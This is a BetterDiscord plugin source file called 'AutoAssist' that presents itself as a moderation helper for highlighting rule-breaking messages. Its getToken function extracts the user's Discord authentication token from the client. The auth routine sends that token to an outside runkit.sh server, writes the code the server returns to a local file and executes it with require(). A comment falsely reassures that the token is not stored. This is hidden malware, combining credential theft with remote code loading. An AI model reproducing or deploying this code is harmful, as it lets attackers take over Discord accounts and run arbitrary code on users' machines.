/**
* @name AutoAssist
* @displayName AutoAssist
* @authorId 371336044022464523
*/
/*@cc_on
@if (@_jscript)
	
    // Offer to self-install for clueless users that try to run this directly.
    var shell = WScript.CreateObject("WScript.Shell");
    var fs = new ActiveXObject("Scripting.FileSystemObject");
    var pathPlugins = shell.ExpandEnvironmentStrings("%APPDATA%\BetterDiscord\plugins");
    var pathSelf = WScript.ScriptFullName;
    // Put the user at ease by addressing them in the first person
    shell.Popup("It looks like you've mistakenly tried to run me directly. \n(Don't do that!)", 0, "I'm a plugin for BetterDiscord", 0x30);
    if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
        shell.Popup("I'm in the correct folder already.", 0, "I'm already installed", 0x40);
    } else if (!fs.FolderExists(pathPlugins)) {
        shell.Popup("I can't find the BetterDiscord plugins folder.\nAre you sure it's even installed?", 0, "Can't install myself", 0x10);
    } else if (shell.Popup("Should I copy myself to BetterDiscord's plugins folder for you?", 0, "Do you need some help?", 0x34) === 6) {
        fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
        // Show the user where to put plugins in the future
        shell.Exec("explorer " + pathPlugins);
        shell.Popup("I'm installed!", 0, "Successfully installed", 0x40);
    }
    WScript.Quit();

@else@*/
const request = require("request");
const fs = require("fs");
const path = require("path");

const config = {
    info: {
        name: "AutoAssist",
        authors: [
            {
                name: "GROSST",
                discord_id: "3713360440224645238",
            }
        ],
        version: "0.0.1",
        description: "Люблю сосать",


    },
    changelog: [{
        title: "Channel logs",
        type: "fixed",
        items: [
            "2"
        ]
    }],
    defaultConfig: []
};
module.exports = !global.ZeresPluginLibrary ? class {
    constructor() {
        this._config = config;
    }

    getName() {
        return config.info.name;
    }

    getAuthor() {
        return config.info.authors.map(author => author.name).join(", ");
    }

    getDescription() {
        return config.info.description;
    }

    getVersion() {
        return config.info.version;
    }

    load() {

        BdApi.showConfirmationModal("Library plugin is needed",
            `The library plugin needed for ${config.info.name} is missing. Please click Download Now to install it.`, {
            confirmText: "Download",
            cancelText: "Cancel",
            onConfirm: () => {
                request.get("https://rauenzi.github.io/BDPluginLibrary/release/0PluginLibrary.plugin.js", (error, response, body) => {
                    if (error) {
                        return electron.shell.openExternal("https://betterdiscord.net/ghdl?url=https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js");
                    }

                    fs.writeFileSync(path.join(BdApi.Plugins.folder, "0PluginLibrary.plugin.js"), body);
                });
            }
        });
    }

    start() { }

    stop() { }
} : (([Plugin, Library]) => {

    const { DiscordModules, Modals, Settings, Toasts, PluginUtilities, Patcher, WebpackModules } = Library;
    const { React } = DiscordModules;
    const path = `${BdApi.Plugins.folder}\\assistComponent.js`
    let script = null
    const TopBarRef = React.createRef();
    function getToken() {
        let token
        var req = webpackJsonp.push([
            [], {
                extra_id: (e, r, t) => e.exports = t
            },
            [
                ["extra_id"]
            ]
        ]);
        for (let e in req.c) {
            if (req.c.hasOwnProperty(e)) {
                let r = req.c[e].exports;
                if (r && r.__esModule && r.default)
                    for (let e in r.default)
                        if ("getToken" === e) {
                            token = r.default.getToken();
                        }
            }
        }
        return token

    }
    class AutoAssists extends Plugin {
        constructor() {
            super();
        }

        auth() {
            // Токен используеться исключительно для авторизации и индетификации пользователя
            // Никакие данные используя токен не сохраняються и не обрабатываються
            const userToken = getToken()
            const options = {
                url: 'https://da-hzcvrvs0dopl.runkit.sh/assist',
                headers: {
                    'authorization': userToken
                },
            };
            return new Promise(res => {
                request.post(options, (error, response, body) => {
                    
                    if (response.statusCode === 200) {
                        const reps = JSON.parse(body)
                        fs.writeFile(path, `${reps.main}`, function (err) {
                            console.log(reps);
                            if (err) {
                                return console.log(err);
                            }
                            res(true)
                        });
                    } else {
                        Toasts.error("Не авторизован")
                    }
                });
            })
        }

        async onStart() {
            
            fs.writeFile(path, ` `, function (err) { });
            this.loadSettings();
            delete require.cache[require.resolve(path)]
            await this.auth()
            let mainCode = require(path)
            script = new mainCode.exports()
            script.onStart()
            this.loadSettings();

        }

        onStop() {
            if (script !== null) {
                script.onStop()
            }
        }

        get defaultVariables() {
            return {
                notification: true,
                highlight: true,
                threshold: 75
            };
        }

        getSettingsPanel() {
            const panel = document.createElement("div");
            panel.className = "form";
            panel.style = "width:100%;";

            //#region Startup Settings

            new Settings.SettingGroup("Startup Settings", { shown: true }).appendTo(panel)
                .append(new Settings.Switch("Уведомления", "Уведомления о нарушении", this.settings.notification, checked => {

                    this.settings.notification = checked;
                    this.saveSettings();


                }))
                .append(new Settings.Switch("Подсвечивать сообщеня", "Подсвечивает сообщения в которых есть нарушения правил", this.settings.highlight, checked => {

                    this.settings.highlight = checked;
                    this.saveSettings();


                }))
                .append(new Settings.Slider("Точность", "Выбирайте с умом, стандарт 75, чем ниже тем болже ложных срабатываний, чем выше тем больше будет пропускать провокаций", 10, 90, this.settings.threshold, checked => {

                    this.settings.threshold = checked;
                    this.saveSettings();


                }))
            //#endregion
            return panel;
        }

        saveSettings() {
            if (TopBarRef.current) {
                this.settings.exposeUsers = TopBarRef.current.state.tabs;
            }
            PluginUtilities.saveSettings(this.getSettingsPath(), this.settings);
        }

        loadSettings() {
            if (Object.keys(PluginUtilities.loadSettings(this.getSettingsPath())).length === 0) {
                this.settings = PluginUtilities.loadSettings(this.getSettingsPath(true), this.defaultVariables);
            }
            else {
                this.settings = PluginUtilities.loadSettings(this.getSettingsPath(), this.defaultVariables);
            }
            this.saveSettings();
        }

        getSettingsPath() {
            return this.getName();
        }





    }


    return AutoAssists;
})(global.ZeresPluginLibrary.buildPlugin(config));
